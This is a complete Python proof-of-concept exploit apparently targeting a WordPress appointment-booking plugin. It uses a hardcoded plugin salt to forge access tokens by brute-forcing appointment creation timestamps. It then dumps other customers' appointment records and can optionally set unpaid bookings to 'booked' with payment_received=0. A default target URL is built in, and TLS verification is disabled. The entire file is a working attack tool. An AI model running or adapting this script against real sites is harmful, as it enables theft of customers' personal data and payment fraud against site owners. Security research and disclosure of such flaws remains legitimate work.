import hmac
import hashlib
import requests
import re
import json
import sys
from datetime import datetime, timedelta, timezone
from argparse import ArgumentParser

# -- constants ----------------------------------------------------------------
HARDCODED_SALT = b"6U2aRk6oGvAZAEXstbFNMppRF=D|H.NX!-gU:-aXGVH<)8kcF~FPor5{Z<SFr~wKz" # hardcode salt stored at /includes/class-utils.php
DEFAULT_TARGET  = "https://wordpress.aprwatch.cloud"
APPT_TYPE_ID    = 1          # change if needed


# -- helpers ------------------------------------------------------------------
def hmac_md5(string: str) -> str:
    return hmac.new(HARDCODED_SALT, string.encode(), hashlib.md5).hexdigest()


def forge_token(appt_id: int, date_created: str) -> str:
    """Replicate SSA_Utils::deprecated_hash($id . $date_created)"""
    return hmac_md5(str(appt_id) + date_created)


def get_public_nonce(session: requests.Session, base_url: str,
                     nonce_page: str | None = None) -> str | None:
    """Extract public_nonce from any page that loads the booking app.
    Tries nonce_page first (if given), then falls back to a list of common paths.
    nonce_page can be a full URL or a relative path (e.g. /booking)."""
    def build_url(page: str | None) -> str:
        if not page:
            return base_url
        if page.startswith("http://") or page.startswith("https://"):
            return page  # already a full URL
        return base_url.rstrip("/") + ("" if page.startswith("/") else "/") + page

    candidates = [nonce_page] if nonce_page else []
    candidates += [None, "/booking", "/appointments", "/?page_id=2", "/contact"]
    for page in candidates:
        url = build_url(page)
        try:
            print(f"[*] Fetching public_nonce from {url} ...")
            r = session.get(url, timeout=15)
        except Exception:
            continue
        # Plugin injects: var ssa = {..., "public_nonce":"XXXXXXXXXX", ...}
        m = re.search(r'"public_nonce"\s*:\s*"([^"]{6,20})"', r.text)
        if m:
            nonce = m.group(1)
            print(f"[+] public_nonce = {nonce}")
            return nonce
        # fallback: plain nonce key inside ssa object
        m = re.search(r'"nonce"\s*:\s*"([^"]{6,20})"', r.text)
        if m:
            nonce = m.group(1)
            print(f"[+] nonce (fallback) = {nonce}")
            return nonce
    print("[-] Could not find nonce in any page. Use --nonce to supply it directly.")
    return None


def get_wp_nonce(session: requests.Session, base_url: str,
                nonce_page: str | None = None) -> str | None:
    """Try to extract X-WP-Nonce (wp_rest nonce) from page source.
    Usually found in wpApiSettings.nonce or window._wpnonce."""
    def build_url(page: str | None) -> str:
        if not page:
            return base_url
        if page.startswith("http://") or page.startswith("https://"):
            return page
        return base_url.rstrip("/") + ("" if page.startswith("/") else "/") + page

    candidates = [nonce_page] if nonce_page else [None]
    for page in candidates:
        url = build_url(page)
        try:
            r = session.get(url, timeout=15)
        except Exception:
            continue
        # wpApiSettings.nonce or wp.apiFetch nonce
        for pat in [
            r'"nonce"\s*:\s*"([0-9a-f]{10})"',
            r'wpApiSettings\s*=\s*\{[^}]*"nonce"\s*:\s*"([^"]{6,20})"',
            r'_wpnonce\s*[=:]\s*["\']([0-9a-f]{10})["\']',
        ]:
            m = re.search(pat, r.text)
            if m:
                wp_nonce = m.group(1)
                print(f"[+] wp_nonce (scraped) = {wp_nonce}")
                return wp_nonce
    return None


def book_dummy_appointment(session: requests.Session, base_url: str,
                           nonce: str,
                           wp_nonce: str | None = None) -> tuple[int, str] | None:
    """Book a dummy appointment and return (id, date_created)."""
    print("[*] Booking dummy appointment to get reference date_created ...")
    # Use a far-future date so it gets availability
    start = (datetime.utcnow() + timedelta(days=60)).strftime("%Y-%m-%d 09:00:00")
    payload = {
        "appointment_type_id": APPT_TYPE_ID,
        "start_date": start,
        "customer_information": {"Name": "PoC Tester", "Email": "poc@example.com"},
    }
    headers = {"X-Public-Nonce": nonce, "Content-Type": "application/json"}
    if wp_nonce:
        headers["X-Wp-Nonce"] = wp_nonce
    r = session.post(f"{base_url}/wp-json/ssa/v1/appointments",
                     json=payload, headers=headers, timeout=15)
    data = r.json()
    if r.status_code == 200 and data.get("data", {}).get("id"):
        appt_id      = data["data"]["id"]
        date_created = data["data"]["date_created"]
        print(f"[+] Own appointment booked -> id={appt_id}, date_created={date_created}")
        return appt_id, date_created
    print(f"[-] Booking failed: {r.status_code} {r.text[:300]}")
    return None


def read_appointment(session: requests.Session, base_url: str,
                     appt_id: int, token: str) -> dict | None:
    """Try to read appointment with a given forged token."""
    url = f"{base_url}/wp-json/ssa/v1/appointments/{appt_id}?token={token}"
    r = session.get(url, timeout=10)
    if r.status_code == 200:
        data = r.json()
        if data.get("data", {}).get("id"):
            return data["data"]
    return None


def brute_force(session: requests.Session, base_url: str,
                target_id: int, create_time: str,
                win_low: int = -300, win_high: int = 300) -> tuple[str, str] | None:
    """
    Brute-force date_created for target_id.
    Tries create_time + win_low ... create_time + win_high (seconds).
    Returns (token, date_created) on success.
    """
    total = win_high - win_low + 1
    print(f"[*] Brute-forcing id={target_id}  center={create_time}  "
          f"range=[{win_low:+d}s ... {win_high:+d}s]  total={total} candidates ...")

    ref_dt = datetime.strptime(create_time, "%Y-%m-%d %H:%M:%S")

    for offset in range(win_low, win_high + 1):
        candidate = (ref_dt + timedelta(seconds=offset)).strftime("%Y-%m-%d %H:%M:%S")
        token = forge_token(target_id, candidate)
        result = read_appointment(session, base_url, target_id, token)
        if result:
            print(f"[+] HIT! offset={offset:+d}s  date_created={candidate}  token={token}")
            return token, candidate
        # progress indicator every 50 attempts
        if (offset - win_low) % 50 == 0:
            print(f"    ... tried {offset - win_low + 1}/{total}", end="\r")

    print("\n[-] Brute-force exhausted, no match found.")
    return None


def escalate_payment(session: requests.Session, base_url: str,
                     appt_id: int, token: str) -> None:
    """P0 + P1 chain: set status=booked and tamper payment_received."""
    print(f"\n[*] Escalating: PUT status=booked + payment_received=0 on id={appt_id} ...")
    payload = {"token": token, "status": "booked", "payment_received": "0"}
    headers = {"Content-Type": "application/json"}
    r = session.put(f"{base_url}/wp-json/ssa/v1/appointments/{appt_id}",
                    json=payload, headers=headers, timeout=10)
    data = r.json()
    if r.status_code == 200 and data.get("data", {}).get("status") == "booked":
        print(f"[+] Payment bypass SUCCESS -- status={data['data']['status']}, "
              f"payment_received={data['data'].get('payment_received')}")
    else:
        print(f"[-] Escalation result: {r.status_code} {json.dumps(data)[:300]}")


# -- main ---------------------------------------------------------------------
def main():
    parser = ArgumentParser(description="SSA P0 Token Forgery PoC")
    parser.add_argument("--url",      default=DEFAULT_TARGET,
                        help="Target WordPress base URL (default: %(default)s)")
    parser.add_argument("--target-id", type=int, default=1,
                        help="Appointment ID to forge token for (default: 1)")
    parser.add_argument("--date-created",
                        help="Known date_created of target (skip brute-force if provided), "
                             "format: 'YYYY-MM-DD HH:MM:SS' (local time, auto-converted to UTC)")
    parser.add_argument("--create-time",
                        help="Approximate creation time of the TARGET appointment "
                             "(center of brute-force range), format: 'YYYY-MM-DD HH:MM:SS' "
                             "(local time, auto-converted to UTC). Skips the dummy-booking step.")
    parser.add_argument("--tz", type=float, default=7.0,
                        help="Your local timezone offset in hours (default: +7 for GMT+7). "
                             "Used to convert --create-time and --date-created to UTC.")
    parser.add_argument("--nonce",
                        help="Supply X-Public-Nonce directly (from window.ssa.api.public_nonce "
                             "in browser console) -- skips page scraping")
    parser.add_argument("--wp-nonce",
                        help="Supply X-Wp-Nonce directly (wp_rest nonce, from "
                             "wpApiSettings.nonce or browser console) -- needed to book appointments")
    parser.add_argument("--nonce-page",
                        help="URL path/page to fetch both nonces from (e.g. /booking), "
                             "tried before fallback paths")
    parser.add_argument("--window", type=str, default="300",
                        help="Brute-force offset range around --create-time. "
                             "Examples: '300' = +-300s (symmetric, default), "
                             "'+100' = 0 to +100s (forward only), "
                             "'-50' = -50s to 0 (backward only).")
    parser.add_argument("--escalate", action="store_true",
                        help="Also chain P1: set status=booked + payment_received=0")
    parser.add_argument("--proxy",
                        help="HTTP/S proxy URL, e.g. http://127.0.0.1:8080")
    args = parser.parse_args()

    # parse --window into (win_low, win_high)
    _w = args.window.strip()
    if _w.startswith('+'):
        win_low, win_high = 0, int(_w[1:])
    elif _w.startswith('-'):
        win_low, win_high = int(_w), 0
    else:
        _v = int(_w)
        win_low, win_high = -_v, _v

    base_url = args.url.rstrip("/")
    tz_offset = timedelta(hours=args.tz)

    def to_utc(dt_str: str) -> str:
        """Convert local datetime string to UTC string.
        Accepts 24-hour (HH:MM:SS / HH:MM) or 12-hour (hh:MM AM/PM / hh:MM:SS AM/PM)."""
        dt = None
        for fmt in (
            "%Y-%m-%d %H:%M:%S",   # 2026-04-08 11:18:00
            "%Y-%m-%d %H:%M",      # 2026-04-08 11:18
            "%Y-%m-%d %I:%M:%S %p", # 2026-04-08 11:18:00 AM
            "%Y-%m-%d %I:%M %p",   # 2026-04-08 11:18 AM
        ):
            try:
                dt = datetime.strptime(dt_str.strip(), fmt)
                break
            except ValueError:
                continue
        if dt is None:
            print(f"[-] Cannot parse datetime '{dt_str}'. "
                  "Use YYYY-MM-DD HH:MM:SS or YYYY-MM-DD HH:MM AM/PM")
            sys.exit(1)
        utc = dt - tz_offset
        return utc.strftime("%Y-%m-%d %H:%M:%S")

    session  = requests.Session()
    session.verify = False           # adjust if self-signed cert in lab
    import urllib3; urllib3.disable_warnings()
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}
        print(f"[*] Proxy: {args.proxy}")

    print(f"\n{'='*60}")
    print(f" SSA P0 PoC -- Token Forgery")
    print(f" Target : {base_url}")
    print(f" Appt ID: {args.target_id}")
    print(f"{'='*60}\n")

    # -- fast path: if date_created is already known --------------------------
    if args.date_created:
        date_created_utc = to_utc(args.date_created)
        print(f"[*] Input date_created={args.date_created} (GMT+{args.tz:g}) -> UTC={date_created_utc}")
        token = forge_token(args.target_id, date_created_utc)
        print(f"[*] Forged token = {token}")
        result = read_appointment(session, base_url, args.target_id, token)
        if result:
            print("[+] Appointment read successfully:\n")
            print(json.dumps(result, indent=2, ensure_ascii=False))
            if args.escalate:
                escalate_payment(session, base_url, args.target_id, token)
        else:
            print("[-] Token invalid -- date_created may be wrong.")
        return

    # -- step 1: get nonces ---------------------------------------------------
    nonce_page = getattr(args, 'nonce_page', None)
    if args.nonce:
        nonce = args.nonce
        print(f"[*] Using provided public_nonce = {nonce}")
    else:
        nonce = get_public_nonce(session, base_url, nonce_page)
    if not nonce:
        print("[-] Cannot proceed without X-Public-Nonce. Use --nonce <value> "
              "(browser console: window.ssa.api.public_nonce)")
        sys.exit(1)

    wp_nonce = getattr(args, 'wp_nonce', None)
    if wp_nonce:
        print(f"[*] Using provided wp_nonce = {wp_nonce}")
    else:
        wp_nonce = get_wp_nonce(session, base_url, nonce_page)
        if not wp_nonce:
            print("[!] X-Wp-Nonce not found -- booking may fail. "
                  "Use --wp-nonce <value> if needed.")

    # -- step 2: get reference date_created -----------------------------------
    if args.create_time:
        ref_date = to_utc(args.create_time)
        print(f"[*] create-time={args.create_time} (GMT+{args.tz:g}) -> UTC={ref_date}")
    else:
        booking = book_dummy_appointment(session, base_url, nonce, wp_nonce)
        if not booking:
            print("[-] Cannot book appointment. Use --create-time 'YYYY-MM-DD HH:MM:SS' to set brute-force center manually.")
            sys.exit(1)
        _, ref_date = booking

    # -- step 3: brute-force target -------------------------------------------
    if args.target_id:
        hit = brute_force(session, base_url, args.target_id, ref_date, win_low, win_high)
        if not hit:
            sys.exit(1)
        token, found_date = hit

        # -- step 4: dump result -----------------------------------------------
        result = read_appointment(session, base_url, args.target_id, token)
        if result:
            print(f"\n[+] Appointment id={args.target_id} dumped successfully:\n")
            print(json.dumps(result, indent=2, ensure_ascii=False))

        # -- step 5 (optional): escalate --------------------------------------
        if args.escalate and hit:
            escalate_payment(session, base_url, args.target_id, token)


if __name__ == "__main__":
    main()
